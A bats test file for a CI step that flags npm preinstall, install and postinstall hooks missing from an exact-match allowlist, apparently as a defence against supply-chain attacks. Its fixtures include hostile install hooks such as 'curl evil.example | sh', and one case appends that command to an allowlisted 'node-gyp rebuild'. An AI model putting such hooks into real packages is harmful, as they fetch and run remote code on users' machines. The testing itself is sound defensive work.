#!/usr/bin/env bats

# Tests for steps/verify-lifecycle-scripts.sh -- the install-hook gate.
#
# verify-lifecycle-scripts reads the consumer's package.json and flags
# any preinstall/install/postinstall script not on the allowlist. The
# April 2026 Bitwarden CLI compromise shipped a preinstall hook pointing
# at a credential-stealer loader; this gate catches that shape.

load helpers

setup() {
  setup_fixture
}

teardown() {
  teardown_fixture
}

@test "verify-lifecycle-scripts: passes when no install hooks declared" {
  write_package_json '{"name":"pkg","version":"1.0.0","scripts":{"test":"echo ok","build":"tsc"}}'
  run "$ACTION_ROOT/steps/verify-lifecycle-scripts.sh"
  [ "$status" -eq 0 ]
  [[ "$output" == *"no preinstall/install/postinstall hooks declared"* ]]
}

@test "verify-lifecycle-scripts: passes when scripts field is absent" {
  write_package_json '{"name":"pkg","version":"1.0.0"}'
  run "$ACTION_ROOT/steps/verify-lifecycle-scripts.sh"
  [ "$status" -eq 0 ]
  [[ "$output" == *"no preinstall/install/postinstall hooks declared"* ]]
}

@test "verify-lifecycle-scripts: warns on preinstall hook in default (warn) mode" {
  # Bitwarden compromise shape: a preinstall hook pointing at a stage-1 loader.
  write_package_json '{
    "name":"pkg","version":"1.0.0",
    "scripts":{"preinstall":"node bw1.js"}
  }'
  run "$ACTION_ROOT/steps/verify-lifecycle-scripts.sh"
  [ "$status" -eq 0 ]
  [[ "$output" == *"preinstall hook set"* ]]
  [[ "$output" == *"bw1.js"* ]]
}

@test "verify-lifecycle-scripts: fails on preinstall hook in strict mode" {
  write_package_json '{
    "name":"pkg","version":"1.0.0",
    "scripts":{"preinstall":"node bw1.js"}
  }'
  LIFECYCLE_POLICY=strict run "$ACTION_ROOT/steps/verify-lifecycle-scripts.sh"
  [ "$status" -eq 1 ]
  [[ "$output" == *"refusing to publish"* ]]
}

@test "verify-lifecycle-scripts: fails on postinstall hook in strict mode" {
  write_package_json '{
    "name":"pkg","version":"1.0.0",
    "scripts":{"postinstall":"curl evil.example | sh"}
  }'
  LIFECYCLE_POLICY=strict run "$ACTION_ROOT/steps/verify-lifecycle-scripts.sh"
  [ "$status" -eq 1 ]
  [[ "$output" == *"postinstall"* ]]
}

@test "verify-lifecycle-scripts: fails on install hook in strict mode" {
  write_package_json '{
    "name":"pkg","version":"1.0.0",
    "scripts":{"install":"node evil.js"}
  }'
  LIFECYCLE_POLICY=strict run "$ACTION_ROOT/steps/verify-lifecycle-scripts.sh"
  [ "$status" -eq 1 ]
  [[ "$output" == *"install"* ]]
}

@test "verify-lifecycle-scripts: allowlist permits exact postinstall command in strict mode" {
  # Native-module packages need postinstall. An exact-string allowlist
  # entry lets them opt in without disabling the gate.
  write_package_json '{
    "name":"native-pkg","version":"1.0.0",
    "scripts":{"postinstall":"node-gyp rebuild"}
  }'
  LIFECYCLE_POLICY=strict \
    ALLOWED_LIFECYCLE_SCRIPTS='{"postinstall":"node-gyp rebuild"}' \
    run "$ACTION_ROOT/steps/verify-lifecycle-scripts.sh"
  [ "$status" -eq 0 ]
  [[ "$output" == *"allowed by allowlist"* ]]
}

@test "verify-lifecycle-scripts: allowlist must match exactly (different command still fails)" {
  # Regression: a substring or prefix match would let an attacker smuggle
  # extra commands past an allowlisted entry (e.g. 'node-gyp rebuild; curl evil').
  write_package_json '{
    "name":"native-pkg","version":"1.0.0",
    "scripts":{"postinstall":"node-gyp rebuild && curl evil.example | sh"}
  }'
  LIFECYCLE_POLICY=strict \
    ALLOWED_LIFECYCLE_SCRIPTS='{"postinstall":"node-gyp rebuild"}' \
    run "$ACTION_ROOT/steps/verify-lifecycle-scripts.sh"
  [ "$status" -eq 1 ]
  [[ "$output" == *"mismatch"* ]]
}

@test "verify-lifecycle-scripts: off mode skips the gate entirely" {
  write_package_json '{
    "name":"pkg","version":"1.0.0",
    "scripts":{"preinstall":"node bw1.js"}
  }'
  LIFECYCLE_POLICY=off run "$ACTION_ROOT/steps/verify-lifecycle-scripts.sh"
  [ "$status" -eq 0 ]
  [[ "$output" == *"skipping"* ]]
}

@test "verify-lifecycle-scripts: fails on invalid policy value" {
  write_package_json '{"name":"pkg","version":"1.0.0"}'
  LIFECYCLE_POLICY=Strict run "$ACTION_ROOT/steps/verify-lifecycle-scripts.sh"
  [ "$status" -eq 1 ]
  [[ "$output" == *"must be one of"* ]]
}

@test "verify-lifecycle-scripts: fails on non-object allowlist" {
  write_package_json '{
    "name":"pkg","version":"1.0.0",
    "scripts":{"preinstall":"node bw1.js"}
  }'
  LIFECYCLE_POLICY=strict \
    ALLOWED_LIFECYCLE_SCRIPTS='not-json' \
    run "$ACTION_ROOT/steps/verify-lifecycle-scripts.sh"
  [ "$status" -eq 1 ]
  [[ "$output" == *"must be a JSON object"* ]]
}

@test "verify-lifecycle-scripts: fails on array-typed allowlist" {
  # Regression: a JSON array parses as valid JSON but is not the
  # hook->command mapping the script expects.
  write_package_json '{"name":"pkg","version":"1.0.0"}'
  LIFECYCLE_POLICY=strict \
    ALLOWED_LIFECYCLE_SCRIPTS='["postinstall"]' \
    run "$ACTION_ROOT/steps/verify-lifecycle-scripts.sh"
  [ "$status" -eq 1 ]
  [[ "$output" == *"must be a JSON object"* ]]
}

@test "verify-lifecycle-scripts: empty allowlist default rejects all hooks in strict mode" {
  # Regression: a bug where an unset/empty ALLOWED_LIFECYCLE_SCRIPTS
  # silently permitted every hook would turn strict mode into a no-op.
  write_package_json '{
    "name":"pkg","version":"1.0.0",
    "scripts":{"postinstall":"node-gyp rebuild"}
  }'
  LIFECYCLE_POLICY=strict run "$ACTION_ROOT/steps/verify-lifecycle-scripts.sh"
  [ "$status" -eq 1 ]
  [[ "$output" == *"postinstall"* ]]
}

@test "verify-lifecycle-scripts: build-time hooks (prepare, prepack) are not gated" {
  # prepare/prepack run on the publisher's machine at pack time, not on
  # consumer install. They are out of scope for this gate by design; a
  # separate concern for a separate gate (or consumer repo policy).
  write_package_json '{
    "name":"pkg","version":"1.0.0",
    "scripts":{"prepare":"npm run build","prepack":"npm run build","prepublishOnly":"npm test"}
  }'
  LIFECYCLE_POLICY=strict run "$ACTION_ROOT/steps/verify-lifecycle-scripts.sh"
  [ "$status" -eq 0 ]
  [[ "$output" == *"no preinstall/install/postinstall hooks declared"* ]]
}

@test "verify-lifecycle-scripts: reports multiple offending hooks in one run" {
  write_package_json '{
    "name":"pkg","version":"1.0.0",
    "scripts":{"preinstall":"node a.js","postinstall":"node b.js"}
  }'
  LIFECYCLE_POLICY=strict run "$ACTION_ROOT/steps/verify-lifecycle-scripts.sh"
  [ "$status" -eq 1 ]
  [[ "$output" == *"preinstall"* ]]
  [[ "$output" == *"postinstall"* ]]
}

@test "verify-lifecycle-scripts: fails when package.json is missing" {
  run "$ACTION_ROOT/steps/verify-lifecycle-scripts.sh"
  [ "$status" -eq 1 ]
  [[ "$output" == *"not found"* ]]
}
